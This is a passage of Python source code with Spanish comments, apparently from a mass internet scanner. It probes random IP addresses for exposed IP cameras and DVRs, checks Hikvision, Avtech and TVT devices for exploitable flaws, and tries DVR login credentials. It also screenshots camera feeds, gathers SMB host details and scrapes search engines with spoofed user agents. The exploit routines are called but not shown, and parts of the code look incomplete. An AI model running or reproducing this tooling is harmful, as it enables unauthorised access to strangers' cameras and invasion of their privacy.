                        os_detected = os_detection(ip, port) if port == 3389 else "N/A"

                        #CHEQUEO DE CAMARAS

                        if command.args.has_screenshot == 'all' and command.args.has_screenshot is not None:
                            screenshot = capture_screenshot(ip, port)
                            
                        banners_cam = {
						    "HTTP/1.0 401 Unauthorized Access Denied",
						    "HTTP/1.1 401 Unauthorized",
						    "RTSP/1.0 405 Method Not Allowed",
						    "RTSP/1.0 400 Method Not Allowed",
						    "RTSP/1.0 400 Bad Request"
						}
                        services_cam = {
						    "rtsp"
						}

                        if is_camera(ip, port, banner, service_name) and (not "HTTP/1.0 302 Found" in banner and not "unknown" in banner):
                            if command.args.has_screenshot == 'cam' and command.args.has_screenshot is not None and "HTTP/1.1 401 Unauthorized" not in banner:
                                capture_screenshot(ip, port, usuario=None, contraseña=None)
                            if any(b.lower() == banner.lower() for b in banners_cam) or any(b.lower() == service_name.lower() for b in services_cam):
                                cam = verificar_respuesta_200(ip, port, tiempo_cancelacion=1)
                            print(f"{Fore.GREEN}[+]Camara-Encontrada{Style.RESET_ALL}")
                            hikvision_vulnerable = check_vuln_hikvision(ip, port)
                            if hikvision_vulnerable:
                                avtech_vulnerable = check_vuln_avtech(ip, port)
                                tvt_vulnerable = check_vuln_tvt(ip, port)
                        else:
                            print(f"{Fore.RED}[-]Cámara-No-Encontrada{Style.RESET_ALL}")
                            
                        if "HTTP/1.0 302 Found" in banner:
                            if command.args.has_screenshot == 'cam' and command.args.has_screenshot is not None:
                                screenshotCam = capture_screenshot(ip, port)
                            credentials_found = scan_dvr_credentials(ip, port)
                            
                        #TERMINA EL CHEQUEO DE CAMARAS


                        data = {
                            "IP": ip,
                            "Puerto": port,
                            "Servicio": service_name,
                            "Banner": banner,
                            "Región": region,
                            "Ciudad": city,
                            "Dominio": domain,  # Include the domain
                            "CuerpoRespuesta": response_body,  # Include the response body
                            "ExploitVulnerable": {
                                "Hikvision": hikvision_vulnerable,
                                "Avtech": avtech_vulnerable,
                                "TVT": tvt_vulnerable,
                                "video.mjpg-Vulnerable": cam
                            },
                            "CredencialesDVR": credentials_found,  # Agrega los datos del escaneo de credenciales del DVR
                            "SistemaOperativo_RDP": os_detected,
                            "Preview": screenshot,
                        }

                        #CHEQUEO SMB INTENTA OBTENER INFO DEL SMB
                        if port == 445:
                            smb_os = check(ip)
                            data["Fecha"] = smb_os['target_info']['MsvAvTimestamp']
                            data["SistemaOperativo_SMB"] = smb_os['version']
                            data["Nombre-PC"] = smb_os['target_info']['MsvAvDnsComputerName']
                            print("Fecha: " + smb_os['target_info']['MsvAvTimestamp'])
                            print("Sistema-Operativo: " + smb_os['version'])
                            print("Nombre-PC: " + smb_os['target_info']['MsvAvDnsComputerName'])
                            print("-" * 50)
                            data["Separador"] = "-" * 50
                        else:
                            smb_os = "N/A"
                            print("-" * 50)
                        #TERMINA EL CHEQUEO SMB

                        GuardarDatos(data)

                    else:
                        print(f"Filtrando: {ip}:{port} Región: {region} Ciudad: {city}\n")

            except socket.gaierror as e:
                generated_ip = None
                if command.args.fast:
                    generated_ip = ip_queue.get()
                    print(generated_ip)
                    ip_queue.put(generated_ip)
                    time.sleep(Tiempocommand.salto)
                if generated_ip is not None and command.salto is not None and command.salto != 0 :
                    ip = generated_ip
                continue
            except Exception as e:
                print(f"Error: {e}")
                continue
            finally:
                sock.close()

        # El executor.shutdown(wait=True) debe ir aquí, fuera del bucle for
        executor.shutdown(wait=True)


        
# Crea una instancia de UserAgent
ua = UserAgent()
# List of User-Agent strings
user_agents = [ua.random for _ in range(10000)]
#user_agents = [
#    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
#    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/54.0",
#    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
#    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
#    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
#    "Mozilla/5.0 (Linux; Android 9; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
    # Add more User-Agent strings as needed
#]

# Lista de motores de búsqueda que deseas utilizar
search_engines = [
    {
        "name": "Google",
        "url": "https://www.google.com/search",
        "color": "\033[92m"  # Código de color ANSI para verde
    },
    {
        "name": "Bing",
        "url": "https://www.bing.com/search",
        "color": "\033[91m"  # Código de color ANSI para rojo
    },
    #{
    #    "name": "DuckDuckGo",
    #    "url": "https://duckduckgo.com/html/",
    #    "color": "\033[94m"  # Código de color ANSI para azul
    #}
]

max_attempts = 3  # Número máximo de intentos por motor de búsqueda
timeout = 5  # Tiempo máximo de espera antes de cambiar de motor (en segundos)
max_failures = 1

def is_engine_working(engine):
    try:
        response = requests.get(engine["url"], timeout=timeout)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

def filter_unique_ips(ip_list):
    if ip_list is None:
        return []  # Devuelve una lista vacía si la entrada es None

    # Utilizamos un conjunto para asegurar direcciones IP únicas
    unique_ips = set()
    filtered_ips = []

    for ip in ip_list:
        if ip not in unique_ips:
            unique_ips.add(ip)
            filtered_ips.append(ip)

    return filtered_ips


def extract_disallowed_urls(robots_content):
    disallowed_urls = set()  # Use a set to store unique URLs
    # Use regular expressions to extract URLs disallowed by the robots.txt file
    disallowed_matches = re.finditer(r'Disallow:\s*(.+)', robots_content, re.IGNORECASE)
    for match in disallowed_matches:
        disallowed_path = match.group(1).strip()
        if disallowed_path:
            disallowed_urls.add(disallowed_path)  # Add to the set to ensure uniqueness
    return disallowed_urls

def search_and_display_titles(query, max_pages=10):
    # ANSI escape codes for text colors
    PURPLE = "\033[35m"
    WHITE = "\033[97m"
    ORANGE = "\033[33m"  # ANSI escape code for orange text
    RESET = "\033[0m"   # ANSI escape code to reset text color
    ip_url_mapping = {}  # Utilizamos un diccionario para mapear direcciones IP a URLs

    with requests.Session() as session:
        for engine in search_engines:
            if not is_engine_working(engine):
                print(f"{PURPLE}Motor: {engine['name']} no está funcionando o está bloqueado. Cambiando de motor...\033[0m")
                continue

            for page in range(1, max_pages + 1):
                search_url = engine["url"]
                params = {
                    "q": query,
                    "start": (page - 1) * 10
                }

                headers = {
                    "User-Agent": random.choice(user_agents)
                }

                try:
                    response = session.get(search_url, params=params, headers=headers, timeout=timeout)
                    response.raise_for_status()
                    soup = BeautifulSoup(response.text, 'html.parser')

                    search_results = soup.find_all('a', href=True)

                    for result in search_results:
                        url = result['href']
                        if url.startswith("http"):
                            domain = urlsplit(url).netloc
                            try:
                                ip_address = socket.gethostbyname(domain)
                                if ip_address != '0.0.0.0':
                                    if ip_address not in ip_url_mapping:
                                        ip_url_mapping[ip_address] = set()  # Use a set to store unique URLs
                                        print(f"{WHITE}URL: {url}{RESET}")
                                    ip_url_mapping[ip_address].add(url)  # Mapear URL a IP

                            except socket.gaierror:
                                continue
                            
                    time.sleep(1)

                except requests.exceptions.RequestException as e:
                    continue

    # Utiliza la función de filtro para obtener direcciones IP únicas
    unique_ips = filter_unique_ips(list(ip_url_mapping.keys()))
    #input("Presiona Enter para continuar...")

    for ip in unique_ips:
        print(f"{PURPLE}IP Address: {ip}\033[0m")
        urls_for_ip = ip_url_mapping[ip]
        for url in urls_for_ip:
            print(f"{WHITE}URL: {url}{RESET}")

            # Check for robots.txt and display disallowed URLs
            robots_url = f"{url.rstrip('/')}/robots.txt"
            try:
                robots_response = session.get(robots_url, timeout=timeout)
                if robots_response.status_code == 200:
                    robots_content = robots_response.text
                    disallowed_urls = extract_disallowed_urls(robots_content)
                    if disallowed_urls:
                        print(f"{ORANGE}Disallowed URLs for {url}:{RESET}")
                        for disallowed_url in disallowed_urls:
                            print(f"{url}/{ORANGE}{disallowed_url}{RESET}")

            except requests.exceptions.RequestException as e:
                continue

        # Check if ports_to_scan is specified and scan the IP
        if ports:
            scan(ip, ports)

def main():
    list_of_links = []  # Populate this list with IP addresses
    ports_to_scan = ports  # Define the ports you want to scan

    for link in list_of_links:
        scan(link, ports_to_scan)

if __name__ == "__main__":
    main()

def format_unknown(value):
    return f"{Fore.RED}{value}{Style.RESET_ALL}"

def get_banner(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(command.args.bn)
        sock.connect((ip, port))
        sock.send(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
        banner = sock.recv(1024).decode().strip()
        sock.close()
        return banner if banner != "unknown" else format_unknown(banner)
    except:
        return format_unknown("unknown")

def get_http_banner(ip):
    try:
        response = requests.head(f"http://{ip}")
        banner = response.headers.get("Server", "unknown")
        return banner if banner != "unknown" else format_unknown(banner)
    except:
        return format_unknown("unknown")

def get_location(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()
        region = data["country"]
        city = data["city"]
        country = data["countryCode"]
        return (
            region if region != "unknown" else format_unknown(region),
            city if city != "unknown" else format_unknown(city),
            country if country != "unknown" else format_unknown(country)
        )
    except:
        return format_unknown("unknown"), format_unknown("unknown"), format_unknown("unknown")
        

##Iniciar Servidor
if os.name == "nt":  # Windows
    subprocess.Popen(["cmd.exe", "/c", "start", "python", "server.py"])
else:  # Linux/Mac
    pass


# Crear una barra de progreso con el número total de direcciones IP a escanear
bar = tqdm(total=ip_queue.qsize(), desc="Escaneando direcciones IP")
clear()
print(f"Buscando {command.ip_pattern}")

command.ip_pattern_list = []

# Definir el número máximo de subprocesos
num_ips = ip_queue.qsize()
if command.args.port == 'all':
    max_workers = None  # Cambiar este número según sea necesario
else:
    max_workers = num_ips

# Crear un ThreadPoolExecutor con el número máximo de hilos
try:
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        while not ip_queue.empty():
            ip = ip_queue.get()
            command.ip_pattern_list.append(ip)
            processed_ips += 1

            future = executor.submit(scan, ip, ports)

            if command.salto is not None and command.salto != 0:
                time.sleep(0.1)  # velocidad rápida
            else:
                time.sleep(1)  # velocidad normal
            
            bar.update(1)  # Actualizar la barra de progreso después de procesar una dirección IP

except KeyboardInterrupt:
    print("Programa interrumpido por el usuario. Cerrando...")

bar.close()
